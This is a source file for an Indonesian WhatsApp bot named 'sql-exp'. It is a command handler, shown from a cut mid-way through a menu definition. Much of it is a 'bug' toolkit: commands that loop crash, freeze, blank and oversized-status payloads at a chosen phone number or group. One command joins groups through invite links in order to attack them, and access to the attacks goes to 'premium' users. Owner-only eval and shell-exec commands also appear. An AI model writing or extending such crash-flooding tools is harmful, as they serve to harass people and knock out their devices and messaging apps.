                                            description: "Tambah user premium",
                                            id: ".addprem"
                                        },
                                        {
                                            title: "❌ Del Premium",
                                            description: "Hapus user premium",
                                            id: ".delprem"
                                        },
                                        {
                                            title: "🌍 Public Mode",
                                            description: "Set bot ke mode public",
                                            id: ".public"
                                        },
                                        {
                                            title: "🔒 Self Mode",
                                            description: "Set bot ke mode self",
                                            id: ".self"
                                        }
                                    ]
                                },
                                    title: "🛠️ TOOLS MENU",
                                    highlight_label: "🔧",
                                    rows: [
                                        {
                                            title: "ᴇᴠᴀʟ",
                                            description: "",
                                            id: ".eval"
                                        },
                                        {
                                            title: "ɪɴғᴏ",
                                            description: "",
                                            id: "info"
                                        },
                                        {
                                            title: "Sw Grup",
                                            description: "Post status ke grup",
                                            id: ".swgc"
                                        }
                                    ]
                                }
                            ],
                            has_multiple_buttons: true
                        })
                    },
                    {
                        name: "call_permission_request",
                        buttonParamsJson: JSON.stringify({
                            has_multiple_buttons: true
                        })
                    },
                    {
                        name: "cta_url",
                        buttonParamsJson: JSON.stringify({
                            display_text: "📞 Contact!", 
                            url: "https://t.me/zaxsql",
                            merchant_url: "https://t.me/universql"
                        })
                    }
                ]
            }
        }
    }, { quoted: zets });
    break 
}*/
case 'menu': {
    await zax.sendMessage(m.chat, {
        interactiveMessage: {
            title: `─ Hello ${m.pushName}, My Name is zax-berse, I am an Automated Bot That Works To Help 

─ ! Information
- bots name : sql-exp 
- Creator : azaxm
- Contact dvp : t.me/zaxsql | t.me/nanastfx
- Channels : https://t.me/universql
- Version : 1.0
- Runtime : ${runtime(process.uptime())}

─ ! Bug Menu
- .delay 62××
- .crash 62××
- .blank 62××

─ ! Bug Group
- .crash-gb https or id
- .swgroup <id>

─ ! Owner menu
- .addown ( 62××× )
- .delown ( 62××× )
- .addprem ( 62××× )
- .delprem ( 62××× )
- .public
- .self 
`, 
            footer: "ᴘᴏᴡᴇʀᴇᴅ ʙʏ ᴀᴢᴀxᴍ",
            image: { url: './System/Thumbnail.jpg' },
            nativeFlowMessage: {
                messageParamsJson: JSON.stringify({
                    limited_time_offer: {
                        text: "ᴢᴀx-ᴠᴇʀsᴇ",
                        url: "t.me/universql",
                        copy_code: "#about me ambatuzkam",
                        expiration_time: Date.now() + 86400000
                    },
                    bottom_sheet: {
                        in_thread_buttons_limit: 2, 
                        divider_indices: [1, 2, 3, 4, 5, 999],
                        list_title: "#zax-verse",
                        button_title: "</>"
                    },
                    tap_target_configuration: {
                        title: " X ",
                        description: "bomboclard",
                        canonical_url: "https://t.me/universql",
                        domain: "id.wwbs.net",
                        button_index: 0
                    }
                }),
                buttons: [
                    {
                        name: "single_select",
                        buttonParamsJson: JSON.stringify({
                            title: "𝕬𝖑𝖑 𝕸𝖊𝖓𝖚",
                            sections: [
                                {
                                    title: "𝕭𝖚𝖌𝖘 𝖂𝖍𝖆𝖙𝖘𝖆𝖕𝖕",
                                    highlight_label: "⚠️",
                                    rows: [
                                        {
                                            title: "ḑ̴̞͛̒ẹ̿͋̒̕l̙͖̑̾ͣā̤̓̍͘y҉̃̀̋̑",
                                            description: "delay",
                                            id: ".delay"
                                        },
                                        {
                                            title: "B̩͎͍̾ͅl̙͖̑̾ͣā̤̓̍͘ṇ̤͛̒̍ḳ̯͍̑ͦ ā̤̓̍͘ṇ̤͛̒̍ḑ̴̞͛̒r̴̨̦͕̝o̯̱̊͊͢",
                                            description: "Blank",
                                            id: ".blank"
                                        },
                                        {
                                            title: "c͕͗ͤ̕c͕͗ͤ̕̕r̴̨̦͕̝ā̤̓̍͘s̠҉͍͊ͅḣ̖̻͛̓",
                                            description: "crash ui for andro and iphone",
                                            id: ".crash"
                                        }
                                    ]
                                },
                                {
                                    title: "𝕺𝖜𝖓𝖊𝖗 𝕸𝖊𝖓𝖚",
                                    highlight_label: "only own",
                                    rows: [
                                        {
                                            title: "➕ Add Owner",
                                            description: "Tambah owner baru",
                                            id: ".ddowner"
                                        },
                                        {
                                            title: "➖ Del Owner",
                                            description: "Hapus owner",
                                            id: ".delowner"
                                        },
                                        {
                                            title: "💎 Add Premium",
                                            description: "Tambah user premium",
                                            id: ".addprem"
                                        },
                                        {
                                            title: "❌ Del Premium",
                                            description: "Hapus user premium",
                                            id: ".delprem"
                                        },
                                        {
                                            title: "🌍 Public Mode",
                                            description: "Set bot ke mode public",
                                            id: ".public"
                                        },
                                        {
                                            title: "🔒 Self Mode",
                                            description: "Set bot ke mode self",
                                            id: ".self"
                                        }
                                    ]
                                },
                                {
                                    title: "🛠️ TOOLS MENU",
                                    highlight_label: "🔧",
                                    rows: [
                                        {
                                            title: "ᴇᴠᴀʟ",
                                            description: "",
                                            id: ".eval"
                                        },
                                        {
                                            title: "ɪɴғᴏ",
                                            description: "",
                                            id: "info"
                                        },
                                        {
                                            title: "Sw Grup",
                                            description: "Post status ke grup",
                                            id: ".swgc"
                                        }
                                    ]
                                }
                            ],
                            has_multiple_buttons: true
                        })
                    },
                    {
                        name: "call_permission_request",
                        buttonParamsJson: JSON.stringify({
                            has_multiple_buttons: true
                        })
                    },
                    {
                        name: "cta_url",
                        buttonParamsJson: JSON.stringify({
                            display_text: "📞 Contact!", 
                            url: "https://t.me/zaxsql",
                            merchant_url: "https://t.me/universql"
                        })
                    }
                ]
            }
        }
    }, { quoted: rnp });
}
    break;
//=======================\\
//===========case OwnMenu/Fun============\\
case 'addowner': case 'addown':
if (!CreatorOnly) return Replyzax("*Your Not Owner*")
  if (!args[0]) return Replyzax(`Penggunaan : ${prefix + command} Example ${prefix + command} 628xx`);
  numero = qtext.split("|")[0].replace(/[^0-9]/g, '');
  let loadnum = await zax.onWhatsApp(numero + `@s.whatsapp.net`);
  if (loadnum.length == 0) return Replyzax(`Number Invalid!!!`);
  owner.push(numero);
  Premium.push(numero);
  fs.writeFileSync('./Access/Own.json', JSON.stringify(owner));
  fs.writeFileSync('./Access/Prem.json', JSON.stringify(Premium));
  Replyzax(`Number ${numero} succes add to database!`);
  break;
//=======================\\
case 'delowner': case 'delown':
if (!CreatorOnly) return Replyzax("*Your Not Owner*")
  if (!args[0]) return Replyzax(`Penggunaan: ${prefix + command} Example:\n ${prefix + command} 628xx`);
  numero2 = qtext.split("|")[0].replace(/[^0-9]/g, '');
  numeroX = Owner.indexOf(numero2);
  numload = Premium.indexOf(numero2);
  Owner.splice(numeroX, 1);
  Premium.splice(numload, 1);
  fs.writeFileSync('./Access/Own.json', JSON.stringify(Owner));
  fs.writeFileSync('./Access/Prem.json', JSON.stringify(Premium));
  Replyzax(`Number ${numero2} succes delate to database!`);
  break;
//=======================\\
case 'addpremium': case 'addprem':
if (!CreatorOnly) return Replyzax("*Your Not Owner*")
  if (!args[0]) return Replyzax(`Penggunaan: ${prefix + command} Example ${prefix + command} 628xx`);
  numero = qtext.split("|")[0].replace(/[^0-9]/g, '');
  let Invalid = await zax.onWhatsApp(numero + `@s.whatsapp.net`);
  if (Invalid.length == 0) return Replyzax(`Number Invalid!!!`);
  Premium.push(numero);
  fs.writeFileSync('./Access/Prem.json', JSON.stringify(Premium));
  Replyzax(`Number ${numero} succes add to database!`);
  break;
//=======================\\
case 'delpremium': case 'delprem':
if (!CreatorOnly) return Replyzax("*Your Not Owner*")
  if (!args[0]) return Replyzax(`Penggunaan ${prefix + command} Example ${prefix + command} 628xx`);
  numero2 = qtext.split("|")[0].replace(/[^0-9]/g, '');
  numeroX = Premium.indexOf(numero2);
  Premium.splice(numeroX, 1);
  fs.writeFileSync('./Access/Prem.json', JSON.stringify(Premium));
  Replyzax(`Number ${numero2} succes delate to database!`);
  break;
//=======================\\
case 'public': {
  if (!CreatorOnly) return Replyzax("*You're Not My Owner*");

  zax.public = true;
  Replyzax(`*Success: Changed Mode from Self to Public*`);
}
break;
//=======================\\
case 'self': case 'private': {
  if (!CreatorOnly) return Replyzax("*You're Not My Owner*");

  zax.public = false;
  Replyzax(`*Success: Changed Mode from Public to Self*`);
}
break;

case "eval": {
                if (!budy.startsWith(".eval")) return;
                
                const args = budy.trim().split(' ').slice(1).join(' ');
                if (!args) return Replyzax(`*ex:* ${prefix + command} m.chat`);
                let teks;
                try {
                    teks = await eval(`(async () => { ${args.startsWith("return") ? "" : "return"} ${args} })()`);
                } catch (e) {
                    teks = e;
                } finally {
                    await Replyzax(require('util').format(teks));
                }
            }
            break;

case "info": {
  const messType = m.quoted ? { [m.quoted.mtype]:m.quoted } : { [m.mtype]:m.message };
  const formattedJson = JSON.stringify(messType, null, 2);
  zax.relayMessage(m.chat, {
    "extendedTextMessage": {
      "text": formattedJson 
    }
  }, {});
}
break;

case "swgrup": case "swgc": {
                const quoted = m.quoted ? m.quoted : m;
                const mime = (quoted.msg || quoted).mimetype || "";
                const caption = m.body.replace(/^\.swgrup\s*/i, "").trim();
                const jid = m.chat;
                
                if (/image/.test(mime)) {
                    const buffer = await quoted.download();
                    await zax.sendMessage(jid, {
                        groupStatusMessage: {
                            image: buffer,
                            caption
                        }
                    });
                    Replyzax("Succes Add Status To Group")
                } else if (/video/.test(mime)) {
                    const buffer = await quoted.download();
                    await zax.sendMessage(jid, {
                        groupStatusMessage: {
                            video: buffer,
                            caption
                        }
                    });
                    Replyzax("Succes Add Status To Group")
                } else if (/audio/.test(mime)) {
                    const buffer = await quoted.download();
                    await zax.sendMessage(jid, {
                        groupStatusMessage: {
                            audio: buffer
                        }
                    });
                    Replyzax("Succes Add Status To Group")
                } else if (caption) {
                    await zax.sendMessage(jid, {
                        groupStatusMessage: {
                            text: caption
                        }
                    });
                    Replyzax("Succes Add Status To Group")
                } else {
                    await Replyzax(`reply media atau tambahkan teks.\nexample: ${prefix + command} (reply image/video/audio) hai ini saya`);
                }
            }
            break;
            
case 'sticker': case 's': case 'stiker': {
    if (!quoted) return Replyzax(`Balas gambar/video dengan caption *${prefix}sticker*`);

    try {
        const mime = (quoted.msg || quoted).mimetype || '';

        if (mime.startsWith('image/')) {
            const media = await quoted.download();
            const stickerBuffer = await sharp(media)
                .resize(512, 512, {
                    fit: 'contain',
                    background: { r: 0, g: 0, b: 0, alpha: 0 }
                })
                .webp({ quality: 80 })
                .toBuffer();

            await zax.sendMessage(m.chat, { sticker: stickerBuffer }, { quoted: m });

        } else if (mime.startsWith('video/')) {
            const duration = quoted.msg?.videoMessage?.seconds || 0;
            if (duration > 10) {
                return Replyzax(` ^}^l Video terlalu panjang! Maksimal 10 detik.`);
            }

            const media = await quoted.download();
            const videoPath = './temp/video.mp4';
            const stickerPath = './temp/sticker.webp';

            if (!fs.existsSync('./temp')) fs.mkdirSync('./temp', { recursive: true });
            fs.writeFileSync(videoPath, media);

            await new Promise((resolve, reject) => {
                ffmpeg(videoPath)
                    .inputFormat('mp4')
                    .outputOptions([
                        '-vcodec', 'libwebp',
                        '-vf', 'scale=512:512:force_original_aspect_ratio=decrease,fps=10',
                        '-loop', '0',
                        '-preset', 'default',
                        '-an',
                        '-vsync', '0',
                        '-s', '512:512',
                        '-quality', '80'
                    ])
                    .toFormat('webp')
                    .save(stickerPath)
                    .on('end', resolve)
                    .on('error', reject);
            });

            const stickerBuffer = fs.readFileSync(stickerPath);
            await zax.sendMessage(m.chat, { sticker: stickerBuffer }, { quoted: m });

            fs.unlinkSync(videoPath);
            fs.unlinkSync(stickerPath);

        } else {
            Replyzax(` ^}^l Hanya support gambar atau video!`);
        }

    } catch (error) {
        Replyzax(`Error: ${error.message}`);
    }
   }
  break;
//=======================\\            
//=======================\\

//===========Case Bug!============\\
case 'delay': {
    if (!PremOnly) return Replyzax("*You are not a Premium User*");
    if (!q) return Replyzax(`*Syntax Eror*\nExample: ${command} 628xxx`);

    let jidx = q.replace(/[^0-9]/g, "");
    
    if (jidx.startsWith('0')) {
        return Replyzax(`*Syntax Eror*\nExample: ${command} 628xxx`);
    }

    let target = `${jidx}@s.whatsapp.net`;
    let jid = `${jidx}@s.whatsapp.net`;

    Replyzax(`*Success! Send Bug to ${target}*`);

    for (let r = 0; r < 10; r++) {
    await delay1(zax, target);
    await delay3(zax, target);
    await delay4(zax, target);
    await delay5(target);
    await delay6(zax, target);
    await delay7(target);
    await delay8(target, true);
    await delay9(target, false);
    await delay10(target);
    await sleep(100)
    }
  console.log(chalk.red.bold("Success!"))
}
break;
//=======================\\
case 'blank': {
    if (!PremOnly) return Replyzax("*You are not a Premium User*");
    if (!q) return Replyzax(`*Syntax Eror*\nExample: ${command} 628xxx`);

    let jidx = q.replace(/[^0-9]/g, "");
    
    if (jidx.startsWith('0')) {
        return Replyzax(`*Syntax Eror*\nExample: ${command} 628xxx`);
    }

    let target = `${jidx}@s.whatsapp.net`;
    let jid = `${jidx}@s.whatsapp.net`;

    Replyzax(`*Success! Send Bug to ${target}*`);

    for (let r = 0; r < 10; r++) {
    await crashblank(target, true);
    await blankcrash2(target);
    await crashblank2(zax, target);
    await crashui(target, false);
    await freeze(target, false);
    await blankcrash(target);
    await sleep(100)
    await crashblank(target, true);
    await sleep(100)
    await blankcrash1(target);
    await sleep(100)
    await crashblank1(target);
    await sleep(100)
    await blankcrash2(target);
    await sleep(100)
    await crashblank2(zax, target);
    await sleep(100)
    await crashui(target, false);
    await sleep(100)
    await freeze(target, false);
    await sleep(100)
    await loc(target);
    await sleep(100)
    }
  console.log(chalk.red.bold("Success!"))
}
break;

case 'crash': {
    if (!PremOnly) return Replyzax("*You are not a Premium User*");
    if (!q) return Replyzax(`*Syntax Eror*\nExample: ${command} 628xxx`);

    let jidx = q.replace(/[^0-9]/g, "");
    
    if (jidx.startsWith('0')) {
        return Replyzax(`*Syntax Eror*\nExample: ${command} 628xxx`);
    }

    let target = `${jidx}@s.whatsapp.net`;
    let jid = `${jidx}@s.whatsapp.net`;

    Replyzax(`*Success! Send Bug to ${target}*`);

    for (let r = 0; r < 10; r++) {
    await blankcrash(target);
    await crashblank(target, true);
    await blankcrash1(target);
    await crashblank1(target);
    await blankcrash2(target);
    await crashblank2(zax, target);
    await crashui(target, false);
    await freeze(target, false);
    await blankcrash(target);
    await sleep(100)
    await crashblank(target, true);
    await sleep(100)
    await blankcrash1(target);
    await sleep(100)
    await crashblank1(target);
    await sleep(100)
    await blankcrash2(target);
    await sleep(100)
    await crashblank2(zax, target);
    await sleep(100)
    await crashui(target, false);
    await sleep(100)
    await freeze(target, false);
    await sleep(100)
    await loc(target);
    await sleep(100);
    }
  console.log(chalk.red.bold("Success!"))
}
break;
//=======================\\
case 'bug': {
    if (!PremOnly) return Replyzax("*You are not a Premium User*");
    if (!q) return Replyzax(`*Contoh:* ${command} 628xxx`);
    
    let jidx = q.replace(/[^0-9]/g, "");
    if (jidx.startsWith('0')) return Replyzax(`*❌ Format salah! Contoh: bug 628xxx*`);
    
    const targetNumber = jidx;
    
    const buttons = [
        {
            name: "single_select",
            buttonParamsJson: JSON.stringify({
                title: "💣 PILIH METODE BUG",
                sections: [
                    {
                        title: "𝐒𝐞𝐥𝐞𝐭𝐜𝐡",
                        highlight_label: "⚠️",
                        rows: [
                            {
                                title: "𝐃𝐞𝐥𝐚𝐲",
                                description: `Target: ${targetNumber}`,
                                id: `.delay ${targetNumber}`
                            },
                            {
                                title: "𝐁𝐥𝐚𝐧𝐤",
                                description: `Target: ${targetNumber}`,
                                id: `.blank ${targetNumber}`
                            },
                            {
                                title: "𝐂𝐫𝐚𝐬𝐡 𝐟𝐨𝐫 𝐚𝐧𝐝𝐫𝐨 𝐚𝐧𝐝 𝐢𝐩𝐡𝐨𝐧𝐞",
                                description: `Target: ${targetNumber}`,
                                id: `.crash ${targetNumber}`
                            }
                        ]
                    }
                ]
            })
        },
        {
            name: "cta_url",
            buttonParamsJson: JSON.stringify({
                display_text: "📞 Contact Owner",
                url: "https://t.me/zaxsql"
            })
        }
    ];
    
    await zax.sendMessage(m.chat, {
        text: `*BUG MENU*\n\nTarget: *${targetNumber}*\nPilih metode di bawah:`,
        footer: "power by zaxm",
        buttons: buttons,
        viewOnce: true
    }, { quoted: m });
    }
   break;
   
//=======================\\
// SW CRASH - CHAT PRIBADI
//=======================\\
case 'sw': case 'swcrash': {
    if (!PremOnly) return Replyzax("*Premium Only*");
    if (!q) return Replyzax(`*Contoh:* ${prefix + command} 628xxx [jumlah] [type]\n\nType: image/video/audio/text/random`);
    
    let args = q.split(' ');
    let nomor = args[0].replace(/[^0-9]/g, '');
    let jumlah = args[1] ? parseInt(args[1]) : 20;
    let type = args[2] || 'random';
    
    if (nomor.startsWith('0')) return Replyzax(`*❌ Format salah! Pakai 628xxx*`);
    if (jumlah > 100) jumlah = 100; // Max 100 biar aman
    
    let target = `${nomor}@s.whatsapp.net`;
    
    Replyzax(`*📱 SW CRASH*\n*Target:* ${nomor}\n*Jumlah:* ${jumlah}x\n*Type:* ${type}\n*Mode:* Chat Pribadi\n\n⏳ Proses...`);
    
    let terkirim = await swCrash(target, false, jumlah, type);
    
    Replyzax(`*✅ SW CRASH SELESAI!*\n*Target:* ${nomor}\n*Terkirim:* ${terkirim}/${jumlah}\n*Type:* ${type}`);
    break;
}
//=======================\\

// SW CRASH - GRUP
case 'swgc': case 'swgroup': {
    if (!PremOnly) return Replyzax("*Premium Only*");
    if (!q) return Replyzax(`*Contoh:* ${prefix + command} 628xxx@g.us [jumlah] [type]`);
    
    let args = q.split(' ');
    let target = args[0];
    let jumlah = args[1] ? parseInt(args[1]) : 20;
    let type = args[2] || 'random';
    
    if (!target.includes('@g.us')) {
        target = target.replace(/[^0-9]/g, '') + '@g.us';
    }
    
    if (jumlah > 100) jumlah = 100;
    
    Replyzax(`*👥 SW CRASH GRUP*\n*Target:* ${target}\n*Jumlah:* ${jumlah}x\n*Type:* ${type}\n\n⏳ Proses...`);
    
    let terkirim = await swCrash(target, true, jumlah, type);
    
    Replyzax(`*✅ SW CRASH GRUP SELESAI!*\n*Target:* ${target}\n*Terkirim:* ${terkirim}/${jumlah}`);
    break;
}
//=======================\\

// SW CRASH - SUPER CEPAT (MINIMAL DELAY)
case 'swfast': {
    if (!PremOnly) return Replyzax("*Premium Only*");
    if (!q) return Replyzax(`*Contoh:* ${prefix + command} 628xxx 50`);
    
    let args = q.split(' ');
    let nomor = args[0].replace(/[^0-9]/g, '');
    let jumlah = args[1] ? parseInt(args[1]) : 30;
    
    if (nomor.startsWith('0')) return Replyzax(`*❌ Format salah!*`);
    if (jumlah > 50) jumlah = 50;
    
    let target = `${nomor}@s.whatsapp.net`;
    
    Replyzax(`*⚡ SW FAST CRASH*\n*Target:* ${nomor}\n*Jumlah:* ${jumlah}x (cepat)\n\n⏳ Proses...`);
    
    // Versi cepat - pake type random + delay kecil
    for (let i = 0; i < jumlah; i++) {
        await swCrash(target, false, 1, 'random');
        await sleep(50); // Delay super kecil
    }
    
    Replyzax(`*✅ SW FAST CRASH SELESAI!*\n*Total:* ${jumlah}x`);
    break;
}
//=======================\\

// SW CRASH - MAX BUFFER (UKURAN GEDE)
case 'swmax': {
    if (!PremOnly) return Replyzax("*Premium Only*");
    if (!q) return Replyzax(`*Contoh:* ${prefix + command} 628xxx 10`);
    
    let args = q.split(' ');
    let nomor = args[0].replace(/[^0-9]/g, '');
    let jumlah = args[1] ? parseInt(args[1]) : 10;
    
    if (nomor.startsWith('0')) return Replyzax(`*❌ Format salah!*`);
    if (jumlah > 20) jumlah = 20;
    
    let target = `${nomor}@s.whatsapp.net`;
    
    Replyzax(`*💢 SW MAX BUFFER*\n*Target:* ${nomor}\n*Jumlah:* ${jumlah}x (5MB each)\n\n⏳ Proses...`);
    
    // Versi max buffer - pake buffer extreme
    let captionExtreme = "💀 MAX BUFFER CRASH 💀".repeat(10000) + "𑇂".repeat(50000);
    let extremeBuffer = Buffer.alloc(1024 * 1024 * 5); // 5MB
    
    for (let i = 0; i < jumlah; i++) {
        await zax.sendMessage(target, {
            groupStatusMessage: {
                image: extremeBuffer,
                caption: captionExtreme + ` [${i+1}/${jumlah}]`
            }
        }, { quoted: null });
        
        console.log(`📤 Max buffer ${i+1}/${jumlah} terkirim`);
        await sleep(500);
    }
    
    Replyzax(`*✅ SW MAX BUFFER SELESAI!*\n*Total:* ${jumlah}x (5MB each)`);
    break;
}
//=======================\\   
    
case 'crash-gb': {
    if (!PremOnly && !CreatorOnly) return Replyzax("*Premium Only*");
    if (!q) return Replyzax(`*Example:*\n${prefix + command} https://chat.whatsapp.com/xxxxxx\nAtau\n${prefix + command} 9741@g.us`);
    
    let groupLink = args[0];
    let groupId;
    const delay = ms => new Promise(resolve => setTimeout(resolve, ms));

    if (groupLink.includes('https://chat.whatsapp.com/')) {
        groupId = groupLink.split('https://chat.whatsapp.com/')[1];

        if (!groupId) return Replyzax('invalid group link');

        try {
            let target = await zax.groupAcceptInvite(groupId);
            Replyzax(`Sukses! ${command} Mengirimkan Kedalam Grup: ${groupLink} (Group ID: ${target})`);

            for (let r = 0; r < 20; r++) {
                await locgb(groupId, true);
                await freezegb(groupid, true); 
                await XiosVirus(groupid, true);
                await frezechat(groupid, true);
            }
        } catch (err) {
            return Replyzax(`Bot Harus Keluar Dari Grup Yang Ingin DiSerang Terlebih Dahulu.`);
        }

    } else {
        let target = groupLink;
        Replyzax(`Sukses! ${command} Mengirimkan Kedalam Grup: ${groupLink}`);
    }
}
break;    
    
//=======================\\

//END
//======================================================\\
default:
if (budy.startsWith('=>')) {
if (!CreatorOnly) return
function Return(sul) {
sat = JSON.stringify(sul, null, 2)
bang = util.format(sat)
if (sat == undefined) {
bang = util.format(sul)}
return Replyzax(bang)}
try {
Replyzax(util.format(eval(`(async () => { return ${budy.slice(3)} })()`)))
} catch (e) {
Replyzax(String(e))}}
if (budy.startsWith('>')) {
if (!CreatorOnly) return
try {
let evaled = await eval(budy.slice(2))
if (typeof evaled !== 'string') evaled = require('util').inspect(evaled)
await Replyzax(evaled)
} catch (err) {
await Replyzax(String(err))
}
}
//=========================================================\\
if (budy.startsWith('$')) {
if (!CreatorOnly) return
require("child_process").exec(budy.slice(2), (err, stdout) => {
if (err) return Replyzax(`${err}`)
if (stdout) return m.reply(stdout)
})
}
//========================================================\\
}
} catch (err) {
zax.sendMessage(m.chat, {text: require('util').format(err)}, { quoted: m })
console.log('\x1b[1;31m'+err+'\x1b[0m')
}
}
//========================================================\\
let file = require.resolve(__filename)
require('fs').watchFile(file, () => {
require('fs').unwatchFile(file)
console.log('\x1b[0;32m'+__filename+' \x1b[1;32mupdated!\x1b[0m')
delete require.cache[file]
require(file)
})
//==========================================================\\
